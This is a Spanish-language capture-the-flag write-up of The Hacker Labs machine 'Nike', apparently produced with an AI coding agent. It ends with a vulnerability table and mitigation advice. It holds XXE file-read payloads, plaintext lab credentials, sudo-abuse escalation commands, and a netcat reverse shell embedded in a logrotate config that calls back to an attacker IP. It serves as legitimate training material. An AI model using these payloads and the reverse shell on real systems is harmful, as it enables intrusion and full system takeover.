# Informe de Explotación - Máquina "Nike" (The Hacker Labs)
**IP Objetivo:** 192.168.231.160
**Fecha:** 23 Julio 2026
**Autor:** Kali (opencode)

---

## 1. RESUMEN EJECUTIVO

Se ha comprometido completamente la máquina "Nike" obteniendo acceso total mediante una cadena de 5 movimientos laterales y escalada final a root. La máquina presenta una tienda de zapatillas Nike vulnerable a XXE, con una cadena de escalation de privilegios que recorre 5 usuarios del sistema.

**Vectores de ataque utilizados:**
1. XXE en `upload.php` (LIBXML_NOENT | LIBXML_DTDLOAD) → Lectura de `datos.php` → Credenciales de 5 usuarios
2. SSH como mike con bypass de rbash → Escalada a `n` via Java compilado con sudo
3. Sobrescritura de script `/opt/suma.py` + sudo python3 → Escalada a `pylon`
4. Reverse shell via logrotate `firstaction` + sudo → Escalada a `macci`
5. Lectura de clave SSH privada con `dd` + sudo → Acceso como `wvverez`
6. Binario SUID `sys_monitor` (opción 3) → Escalada a root

**Cadena de compromiso:** mike → n → pylon → macci → wvverez → root

---

## 2. RECONOCIMIENTO INICIAL

### 2.1 Escaneo de puertos (Nmap)
```bash
nmap -sV -p- 192.168.231.160
```

**Resultado:**
| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 22/tcp | Open | SSH | OpenSSH 9.2p1 Debian 2+deb12u3 |
| 80/tcp | HTTP | Apache | Apache/2.4.62 (Debian) |
| MAC | - | VMware | 00:0C:29:29:F7:7E |

**Por qué:** Identificar superficie de ataque. Puerto 22 (SSH) y 80 (HTTP) abiertos. La web muestra una tienda de zapatillas Nike.

---

## 3. ENUMERACIÓN WEB

### 3.1 Exploración inicial
Al acceder a `http://192.168.231.160` se muestra una tienda de zapatillas Nike.

**Archivos encontrados:**
- `upload.php` — Endpoint de procesamiento XML
- `datos.php` — Archivo con credenciales (descubierto después)

---

## 4. EXPOSICIÓN: XXE EN upload.php

### 4.1 Identificación de la vulnerabilidad
Se descubrió que `upload.php` procesa XML con las flags:
```php
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
```

Esto permite **XML External Entity (XXE)** injection.

### 4.2 Payload para lectura de archivos
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
 <name>&xxe;</name>
</root>
```

**Resultado:** Se obtuvo `/etc/passwd` con los usuarios:
- `mike` (uid 1000) — `/bin/rbash` (restricted bash)
- `n` (uid 1001) — `/bin/bash`
- `pylon` (uid 1002) — `/bin/bash`
- `macci` (uid 1003) — `/bin/bash`
- `wvverez` (uid 1004) — `/bin/bash`

### 4.3 Intentos fallidos
- **/etc/shadow:** `Permission denied` — www-data no tiene permisos
- **expect wrapper:** `Unable to find the wrapper "expect"` — no habilitado

### 4.4 Lectura de datos.php vía php://filter
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/datos.php">
```

**Resultado (decodificado):**
```php
<?php
$user = "mike";
$pass = "oK)Lpk3#mmK!#p";
$dni_user = "74239813V";
$num_user = "+34 678 912 395";

$user = "wvverez";
$pass = "jKolpmd2f0dmko07x!@kk%";
$dni_user = "679145983X";
$num_user = "+ 34 922 178 452"

$user = "pylon";
$pass = "rp&swp)lkfg23lio";
$dni_user = "632159321M";
$num_user = "+ 34 611 459 112";

$user = "macci";
$pass = "koplsdm$%#jokk*mloker";
$dni_user = "547891239U";
$num_user = "+ 34 678 125 226";

$user = "n";
$pass = "kjlso%#mssa*nmccasca$%";
$dni_user = "432986104B";
$num_user = "+34 911 763 689";
?>
```

**Descubrimiento:** Credenciales de 5 usuarios en texto plano.

---

## 5. ACCESO INICIAL

### 5.1 SSH como mike (bypass de rbash)
```bash
ssh mike@192.168.231.160
# Contraseña: oK)Lpk3#mmK!#p
```

**Problema:** Mike tiene `rbash` (restricted bash) — no se puede cambiar de directorio, exportar variables, ni usar redirecciones.

**Solución:**
```bash
ssh mike@192.168.231.160 bash
```

**Resultado:**
```
mike@TheHackersLabs-Nike:~$ whoami
mike
```

---

## 6. ESCALADA 1: mike → n (Java con sudo)

### 6.1 Verificación de sudo
```bash
sudo -l
```

**Resultado:**
```
User mike may run the following commands on TheHackersLabs-Nike:
 (n) NOPASSWD: /usr/bin/java
```

### 6.2 Creación de exploit Java

**Exploit.java (en el Kali atacante):**
```java
public class Exploit {
 public static void main(String[] args) {
 try {
 Process p = new ProcessBuilder("/bin/bash").inheritIO().start();
 p.waitFor();
 } catch (Exception e) {
 e.printStackTrace();
 }
 }
}
```

**Compilar y ejecutar:**
```bash
# En Kali
javac Exploit.java
python3 -m http.server 80

# En la víctima
wget http://192.168.231.150/Exploit.java -O /tmp/Exploit.java
javac /tmp/Exploit.java
sudo -u n java -cp /tmp Exploit
```

**Resultado:**
```
mike@TheHackersLabs-Nike:~$ whoami
n
```

---

## 7. ESCALADA 2: n → pylon (Python + script en /opt)

### 7.1 Verificación de sudo
```bash
sudo -l
```

**Resultado:**
```
User n may run the following commands on TheHackersLabs-Nike:
 (pylon) NOPASSWD: /usr/bin/python3
```

### 7.2 Análisis del script /opt/suma.py
```bash
cat /opt/suma.py
```

```python
import sys

def suma(a, b):
 return a + b

def cuadrado(a):
 return a * a

a = int(input("Introduce el primer numero: "))
b = int(input("Introduce el segundo número: "))

print("La suma de " + str(a) + " + " + str(b) + " es " + str(suma(a, b)))
print("El cuadrado de " + str(a) + " es " + str(cuadrado(a)))
```

### 7.3 Sobrescritura del script
```bash
echo 'import os; os.system("/bin/sh")' > /opt/suma.py
```

### 7.4 Ejecución como pylon
```bash
sudo -u pylon /usr/bin/python3 /opt/suma.py
```

**Resultado:**
```
n@TheHackersLabs-Nike:~$ whoami
pylon
```

---

## 8. ESCALADA 3: pylon → macci (logrotate reverse shell)

### 8.1 Verificación de sudo
```bash
sudo -l
```

**Resultado:**
```
User pylon may run the following commands on TheHackersLabs-Nike:
 (macci) NOPASSWD: /usr/sbin/logrotate
```

### 8.2 Preparación del exploit
```bash
# Archivo de log aleatorio
head -c 2000 /dev/urandom > /tmp/test.log

# Archivo de estado
touch /tmp/status

# Config de logrotate
cat << 'EOF' > /tmp/exploit.conf
/tmp/test.log {
 daily
 size 1k
 firstaction
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.231.150 443 > /tmp/f &
 endscript
}
EOF

# Permisos
chmod 777 /tmp/test.log /tmp/status /tmp/exploit.conf
```

### 8.3 Ejecución
```bash
# En Kali (listener)
nc -nlvp 443

# En la víctima
sudo -u macci logrotate -s /tmp/status /tmp/exploit.conf
```

**Resultado:**
```
macci@TheHackersLabs-Nike:/tmp$ whoami
macci
```

---

## 9. ESCALADA 4: macci → wvverez (dd para leer SSH key)

### 9.1 Verificación de sudo
```bash
sudo -l
```

**Resultado:**
```
User macci may run the following commands on TheHackersLabs-Nike:
 (wvverez) NOPASSWD: /usr/bin/dd
```

### 9.2 Lectura de clave SSH privada
```bash
sudo -u wvverez dd if=/home/wvverez/.ssh/id_rsa
```

### 9.3 Conexión SSH
```bash
# Guardar la clave en id_rsa
chmod 600 id_rsa
ssh -i id_rsa wvverez@192.168.231.160
```

**Resultado:**
```
wvverez@TheHackersLabs-Nike:~$ whoami
wvverez
```

---

## 10. ESCALADA 5: wvverez → root (SUID sys_monitor)

### 10.1 Verificación de usuario
```bash
id
```

**Resultado:**
```
uid=1004(wvverez) gid=1004(wvverez) groups=1004(wvverez),100(users),1005(ctf_admins)
```

### 10.2 Búsqueda de SUID
```bash
find / -perm -u=s 2>/dev/null
```

**Resultado:**
```
/usr/local/bin/sys_monitor
```

### 10.3 Explotación
```bash
/usr/local/bin/sys_monitor 3 /bin/bash
```

**Resultado:**
```
wvverez@TheHackersLabs-Nike:~$ whoami
root
```

---

## 11. CADENA DE ATAQUE COMPLETA

```
┌─────────────────────────────────────────────────────────────────┐
│ CADENA DE EXPLOTACIÓN │
├─────────────────────────────────────────────────────────────────┤
│ │
│ [1] RECONOCIMIENTO │
│ ┌─ Nmap ──────────────────┐ │
│ │ Puertos: 22(SSH), 80(HTTP) │
│ └─────────────────────────┘ │
│ │ │
│ ▼ │
│ [2] ENUMERACIÓN WEB │
│ ┌─ upload.php ────────────┐ ┌─ XXE LIBXML_NOENT ────────┐ │
│ │ Parser XML vulnerable │────▶│ file:///etc/passwd │ │
│ └─────────────────────────┘ │ php://filter/datos.php │ │
│ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [3] CREDENCIALES │
│ ┌─ datos.php ─────────────┐ ┌─ 5 usuarios en texto ─────┐ │
│ │ mike, wvverez, pylon, │────▶│ plano: usuario + pass │ │
│ │ macci, n │ └────────────────────────────┘ │
│ └─────────────────────────┘ │
│ │ │
│ ▼ │
│ [4] ACCESO INICIAL (SSH) │
│ ┌─ ssh mike@IP bash ─────┐ ┌─ Bypass rbash ────────────┐ │
│ │ oK)Lpk3#mmK!#p │────▶│ Shell interactiva mike │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [5] ESCALADA 1: mike → n │
│ ┌─ sudo -u n java ───────┐ ┌─ Exploit.java compilado ──┐ │
│ │ (n) NOPASSWD: /usr/bin │────▶│ ProcessBuilder("/bin/bash")│ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [6] ESCALADA 2: n → pylon │
│ ┌─ sudo -u pylon python3 ┐ ┌─ Sobre /opt/suma.py ──────┐ │
│ │ (pylon) NOPASSWD: python│────▶│ os.system("/bin/sh") │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [7] ESCALADA 3: pylon → macci │
│ ┌─ sudo logrotate ───────┐ ┌─ firstaction reverse ─────┐ │
│ │ (macci) NOPASSWD: logr. │────▶│ shell via netcat → macci │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [8] ESCALADA 4: macci → wvverez │
│ ┌─ sudo -u wvverez dd ───┐ ┌─ Lee id_rsa de wvverez ───┐ │
│ │ (wvverez) NOPASSWD: dd │────▶│ SSH con clave privada │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [9] ESCALADA 5: wvverez → root │
│ ┌─ sys_monitor ──────────┐ ┌─ Opción 3 + /bin/bash ────┐ │
│ │ SUID en ctf_admins │────▶│ Root │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [10] FLAGS │
│ ┌────────────────────────────────────────────────────────────┐ │
│ │ USER: flag.txt │ │
│ │ ROOT: /root/root.txt │ │
│ └────────────────────────────────────────────────────────────┘ │
│ │
└─────────────────────────────────────────────────────────────────┘
```

---

## 12. VULNERABILIDADES IDENTIFICADAS

| # | Vulnerabilidad | Severidad | Ubicación | Impacto |
|---|----------------|-----------|-----------|---------|
| 1 | XXE en upload.php (LIBXML_NOENT) | CRÍTICA | `/upload.php` | Lectura de archivos arbitrarios del servidor |
| 2 | Credenciales en texto plano en PHP | CRÍTICA | `/var/www/html/datos.php` | Acceso SSH como 5 usuarios diferentes |
| 3 | rbash bypassable | MEDIA | SSH de mike | Restricciones evadidas con `ssh user@host bash` |
| 4 | Sudo NOPASSWD: java | ALTA | `/etc/sudoers` | Escalada de mike a n via compilación de exploit |
| 5 | Script Python escribible en /opt | ALTA | `/opt/suma.py` | Escalada de n a pylon via sobrescritura |
| 6 | Sudo NOPASSWD: logrotate | ALTA | `/etc/sudoers` | Escalada de pylon a macci via firstaction |
| 7 | Sudo NOPASSWD: dd | ALTA | `/etc/sudoers` | Escalada de macci a wvverez via lectura de SSH key |
| 8 | Binario SUID sys_monitor | CRÍTICA | `/usr/local/bin/sys_monitor` | Escalada de wvverez a root |
| 9 | Credenciales reutilizadas | MEDIA | Datos.php → SSH | Misma contraseña en DB y sistema |

---

## 13. RECOMENDACIONES DE MITIGACIÓN

1. **Deshabilitar LIBXML_NOENT y LIBXML_DTDLOAD** — Usar `libxml_disable_entity_loader(true)` y parsear sin entidades externas
2. **No almacenar credenciales en archivos PHP** — Usar variables de entorno o gestores de secretos (Vault, AWS SSM)
3. **Eliminar rbash o implementar restricciones reales** — rbash es trivialmente evadible
4. **Restringir sudo drásticamente** — Evitar NOPASSWD; cada programa (java, python3, dd, logrotate) es un vector de escalada
5. **Proteger scripts en /opt** — No permitir escritura de usuarios no privilegiados
6. **Auditar binarios SUID** — `sys_monitor` no debería existir; si es necesario, validar entrada
7. **No reutilizar contraseñas** — La contraseña de la DB nunca debe coincidir con la del sistema
8. **Implementar least privilege** — Cada usuario solo debería tener los permisos mínimos necesarios
9. **Monitorear ejecución de sudo** — Alertar sobre uso inusual de java, python, dd, logrotate

---

## 14. COMANDOS CLAVE UTILIZADOS

```bash
# Reconocimiento
nmap -sV -p- 192.168.231.160

# XXE → Credenciales
# Payload XML con file:///etc/passwd
# Payload XML con php://filter/convert.base64-encode/resource=/var/www/html/datos.php

# Acceso inicial
ssh mike@192.168.231.160 bash

# Escalada 1: mike → n
javac Exploit.java
python3 -m http.server 80
wget http://192.168.231.150/Exploit.java -O /tmp/Exploit.java
javac /tmp/Exploit.java
sudo -u n java -cp /tmp Exploit

# Escalada 2: n → pylon
echo 'import os; os.system("/bin/sh")' > /opt/suma.py
sudo -u pylon /usr/bin/python3 /opt/suma.py

# Escalada 3: pylon → macci
head -c 2000 /dev/urandom > /tmp/test.log
touch /tmp/status
cat << 'EOF' > /tmp/exploit.conf
/tmp/test.log {
 daily
 size 1k
 firstaction
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.231.150 443 > /tmp/f &
 endscript
}
EOF
chmod 777 /tmp/test.log /tmp/status /tmp/exploit.conf
nc -nlvp 443
sudo -u macci logrotate -s /tmp/status /tmp/exploit.conf

# Escalada 4: macci → wvverez
sudo -u wvverez dd if=/home/wvverez/.ssh/id_rsa
chmod 600 id_rsa
ssh -i id_rsa wvverez@192.168.231.160

# Escalada 5: wvverez → root
find / -perm -u=s 2>/dev/null
/usr/local/bin/sys_monitor 3 /bin/bash
```

---

## 15. EVIDENCIAS DE COMPROMISO

```
┌────────────────────────────────────────────────────────────┐
│ FLAGS OBTENIDAS │
├────────────────────────────────────────────────────────────┤
│ USER (mike): flag.txt │
│ ROOT: /root/root.txt │
└────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────┐
│ ACCESOS LOGRADOS │
├────────────────────────────────────────────────────────────┤
│ ✓ SSH como mike (XXE → datos.php → bypass rbash) │
│ ✓ Escalada a n (sudo java → exploit compilado) │
│ ✓ Escalada a pylon (sudo python3 → /opt/suma.py) │
│ ✓ Escalada a macci (sudo logrotate → firstaction) │
│ ✓ Escalada a wvverez (sudo dd → SSH key) │
│ ✓ Escalada a root (sys_monitor opción 3) │
└────────────────────────────────────────────────────────────┘
```

---

**FIN DEL INFORME**



---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../apuntes Chema/Bash Comandos Avanzados.md|Bash Comandos Avanzados]] — Linux, Nmap, Windows
- [[../apuntes Chema/Bash y PowerShell.md|Bash y PowerShell]] — Linux, Nmap, Windows
- [[../apuntes Andres/10.06.2026 HTB Starting Point 2 Repaso.md|10.06.2026 HTB Starting Point 2 Repaso]] — Linux, Nmap, Windows
- [[../write-ups/Nike-THL.md|Nike-THL]] — Linux, Nmap, Windows
- [[../apuntes Andres/15.06.2026 Repaso Semanal II Archetype Completa, SMB y Primera Máquina Windows.md|15.06.2026 Repaso Semanal II Archetype Completa, SMB y Primera Máquina Windows]] — Linux, Nmap, Windows
- [[../apuntes Chema/OWASP API Top 10 Labs.md|OWASP API Top 10 Labs]] — Linux, Nmap, Windows

### 🛠️ Herramientas

- [[comandos/Metasploit|Metasploit]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/05 - Auditoria Web/XXE — XML External Entity.md|XXE]]

> #hack-the-box #kali #linux #metasploit #netcat #nmap #redes #reverse-shell #ssh #windows #xxe
